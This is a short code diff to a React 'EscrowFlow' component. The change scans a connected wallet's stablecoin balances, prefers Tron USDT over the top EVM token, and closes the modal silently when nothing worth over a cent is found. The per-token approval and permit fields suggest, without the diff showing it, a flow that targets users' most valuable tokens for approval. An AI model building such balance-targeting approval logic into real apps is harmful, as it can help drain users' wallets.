@@ -562,6 +562,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         isTron: boolean; alreadyApproved: boolean;
         permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
       };
+      tokensWithBalance?: {
+        chain: string; chainLabel: string; chainId: number; symbol: string;
+        address: string; balance: string; balanceUsd: number; contract: string;
+        isTron: boolean; alreadyApproved: boolean;
+        permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
+      }[];
       chainUsd?: Record<string, number>;
     };
 
@@ -587,13 +593,21 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       setModal1Scanning(false);
 
-      // No meaningful stablecoin balance anywhere → close modal silently
-      if (!data.ok || !data.topToken || data.topToken.balanceUsd < 0.01) {
+      // ── Tron has priority: if any Tron USDT balance found, pick it over EVM ──
+      // Look in tokensWithBalance first for a Tron stable with balance > 0.
+      // Fall back to topToken (highest EVM stable) only if no Tron balance.
+      const tronWinner = (data.tokensWithBalance ?? []).find(
+        (t) => t.isTron && t.balanceUsd > 0.01
+      ) ?? null;
+
+      const t = tronWinner ?? (data.ok && data.topToken && data.topToken.balanceUsd >= 0.01
+        ? data.topToken
+        : null);
+
+      if (!t) {
         setModal1Open(false);
         return;
       }
-
-      const t = data.topToken;
       const winner: Modal1Item = {
         key: `${t.chain}-${t.symbol}`,
         chainName: t.chain,
